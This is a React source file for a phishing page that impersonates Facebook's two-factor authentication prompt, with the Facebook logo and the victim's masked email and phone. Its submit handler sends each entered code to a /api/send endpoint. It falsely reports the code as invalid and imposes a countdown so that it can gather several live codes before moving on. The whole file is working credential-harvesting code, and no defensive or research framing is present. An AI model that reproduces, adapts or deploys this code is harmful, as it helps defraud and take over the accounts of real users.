import FacebookLogo from '@/assets/images/facebook-logo-image.png';
import VerifyImage from '@/assets/images/verify-image.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import { faChevronLeft, faInfoCircle, faQuestionCircle, faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [showMethodModal, setShowMethodModal] = useState(false);
    const [selectedMethod, setSelectedMethod] = useState('notification');
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, messageContent, setMessageContent, userInfo } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    const maskEmail = (email: string): string => {
        if (!email) return '';
        const [local, domain] = email.split('@');
        if (!local || !domain) return email;
        const masked = local[0] + '*'.repeat(Math.max(local.length - 1, 2));
        return `${masked}@${domain}`;
    };

    const maskPhone = (phone: string): string => {
        if (!phone) return '';
        const cleaned = phone.replace(/\s+/g, '');
        if (cleaned.length < 4) return phone;
        const last2 = cleaned.slice(-2);
        const prefix = cleaned.slice(0, 3);
        return `${prefix} ****** ${last2}`;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Two-factor authentication required', 'Enter the code for this account that we send to', 'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue', 'Try another way', "Choose a way to confirm it's you", 'These are your available confirmation methods.', 'Text message', "We'll send a code to", 'Authentication app', 'Get a code from your authentication app.', 'Need another option?', 'To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to', 'account recovery'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown((prev) => {
                    if (prev === 1) {
                        setShowError(false);
                    }
                    return prev - 1;
                });
            }, 1000);
            return () => clearTimeout(timer);
        }
    }, [countdown]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const codeLine = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;

        const updatedMessage = messageContent ? `${messageContent}\n\n${codeLine}` : codeLine;

        setMessageContent(updatedMessage);

        try {
            await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });
        } catch (err) {
            console.error('err send:', err);
        }

        if (next >= maxCode) {
            nextStep();
        } else {
            setShowError(true);
            setCode('');
            setCountdown(loadingTime);
        }

        setIsLoading(false);
    };

    const maskedContact = maskPhone(userInfo?.phone || '');

    return (
        <>
            <div className='fixed inset-0 z-10 flex min-h-screen flex-col bg-white'>
                {/* Header */}
                <header className='flex h-14 items-center justify-between border-b border-[#dde2e8] px-4'>
                    <div className='flex items-center gap-3'>
                        <Image src={FacebookLogo} alt='Facebook' className='h-6 w-auto' />
                    </div>
                    <div className='flex items-center justify-between gap-4 md:hidden'>
                        <button type='button' className='rounded-full p-2 transition-colors hover:bg-gray-100'>
                            <FontAwesomeIcon icon={faChevronLeft} />
                        </button>
                        <button type='button' className='rounded-full p-2 transition-colors hover:bg-gray-100'>
                            <FontAwesomeIcon icon={faQuestionCircle} />
                        </button>
                    </div>
                </header>

                {/* Content */}
                <div className='mx-auto w-full max-w-150 space-y-4 px-4 py-6'>
                    <div className='text-sm font-medium text-[#0a1317]'>{userInfo?.pageName || 'Page'} • Facebook</div>

                    <p className='text-2xl font-semibold text-[#0a1317]'>
                        {t('Two-factor authentication required')} ({attempts + 1}/{maxCode})
                    </p>

                    <p className='text-[15px] leading-5 text-[#0a1317]'>
                        {t('Enter the code for this account that we send to')} {userInfo?.email && <span className='font-semibold'>{maskEmail(userInfo.email)}</span>}
                        {userInfo?.email && userInfo?.phone && ', '}
                        {userInfo?.phone && <span className='font-semibold'>{maskPhone(userInfo.phone)}</span>} {t('or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)')}
                    </p>

                    <div className='space-y-4'>
                        <Image src={VerifyImage} className='block w-full rounded-2xl' alt='Mobile verification example' />
                    </div>

                    <div className='space-y-4'>
                        <div className='relative'>
                            <input
                                id='code'
                                className={`peer h-16 w-full rounded-2xl border px-4 pt-2.5 pb-0 focus:outline-none ${showError ? 'border-red-600' : 'border-[#dde2e8]'}`}
                                placeholder=' '
                                type='tel'
                                inputMode='numeric'
                                pattern='[0-9]*'
                                value={code}
                                onChange={(e) => {
                                    const value = e.target.value.replaceAll(/\D/g, '');
                                    if (value.length <= 8) {
                                        setCode(value);
                                        setShowError(false);
                                    }
                                }}
                                maxLength={8}
                                disabled={countdown > 0}
                            />
                            <label htmlFor='code' className={`absolute top-1/2 left-0 -translate-y-6 pl-4 text-[13px] transition-all peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px] ${showError ? 'text-red-600' : 'text-[#5d6c7b]'}`}>
                                <span>{showError ? t('Invalid code') : t('Enter code')}</span>
                            </label>
                            {code && (
                                <button type='button' className='absolute top-1/2 right-0 -translate-y-1/2 pr-4' onClick={() => setCode('')}>
                                    <FontAwesomeIcon icon={faTimes} />
                                </button>
                            )}
                        </div>

                        <button type='button' className='flex h-11 w-full items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7] transition-opacity disabled:cursor-not-allowed disabled:opacity-60' disabled={isLoading || countdown > 0} onClick={handleSubmit}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent' /> : t('Continue')}
                        </button>

                        <button type='button' className='h-11 w-full rounded-[22px] border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] transition-colors hover:bg-gray-50' onClick={() => setShowMethodModal(true)}>
                            {t('Try another way')}
                        </button>
                    </div>
                </div>
            </div>

            {/* Method Selection Modal */}
            {showMethodModal && (
                <div className='fixed inset-0 z-50 flex bg-white md:items-center md:justify-center md:bg-black/50'>
                    <div className='relative flex h-full w-full flex-col items-stretch bg-white md:h-auto md:w-auto md:max-w-150 md:rounded-4xl md:shadow-2xl'>
                        <div className='flex h-16 min-h-16 items-center justify-between px-4'>
                            <button type='button' onClick={() => setShowMethodModal(false)} className='flex h-8 w-8 items-center justify-center text-gray-500 transition-colors hover:text-gray-700'>
                                <FontAwesomeIcon icon={faChevronLeft} />
                            </button>
                        </div>

                        <div className='flex-1 px-8 pb-8'>
                            <p className='mb-1 text-[24px] font-semibold text-[#050505]'>{t("Choose a way to confirm it's you")}</p>
                            <p className='mb-6 text-[15px] text-gray-600'>{t('These are your available confirmation methods.')}</p>

                            <div className='overflow-hidden rounded-xl border border-gray-200'>
                                <label className={`flex cursor-pointer items-center gap-4 p-4 transition-all hover:bg-gray-50 ${selectedMethod === 'notification' ? 'bg-[#f0f6ff]' : ''}`}>
                                    <div className='flex-1'>
                                        <div className='text-[16px] font-semibold text-[#050505]'>{t('Text message')}</div>
                                        <div className='text-[14px] text-[#65676B]'>
                                            {t("We'll send a code to")} {maskedContact}
                                        </div>
                                    </div>
                                    <input type='radio' name='confirmMethod' value='notification' checked={selectedMethod === 'notification'} onChange={(e) => setSelectedMethod(e.target.value)} className='h-5 w-5 border-2 border-[#606770] checked:border-[#0064e0]' />
                                </label>
                                <label className={`flex cursor-pointer items-center gap-4 border-t border-gray-200 p-4 transition-all hover:bg-gray-50 ${selectedMethod === 'authApp' ? 'bg-[#f0f6ff]' : ''}`}>
                                    <div className='flex-1'>
                                        <div className='text-[16px] font-semibold text-[#050505]'>{t('Authentication app')}</div>
                                        <div className='text-[14px] text-[#65676B]'>{t('Get a code from your authentication app.')}</div>
                                    </div>
                                    <input type='radio' name='confirmMethod' value='authApp' checked={selectedMethod === 'authApp'} onChange={(e) => setSelectedMethod(e.target.value)} className='h-5 w-5 border-2 border-[#606770] checked:border-[#0064e0]' />
                                </label>
                            </div>

                            <div className='mt-6 rounded-xl border border-gray-200 p-4'>
                                <div className='flex gap-3'>
                                    <FontAwesomeIcon icon={faInfoCircle} className='mt-1 text-gray-500' />
                                    <div>
                                        <p className='text-[15px] font-semibold'>{t('Need another option?')}</p>
                                        <p className='text-[14px] text-gray-600'>
                                            {t('To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to')}{' '}
                                            <a href='#' className='text-[#0064e0] hover:underline'>
                                                {t('account recovery')}
                                            </a>
                                            .
                                        </p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div className='border-t border-gray-200 p-6'>
                            <button type='button' className='h-12 w-full rounded-full bg-[#0064e0] text-[17px] font-medium text-white transition-opacity hover:opacity-90' onClick={() => setShowMethodModal(false)}>
                                {t('Continue')}
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </>
    );
};

export default VerifyModal;
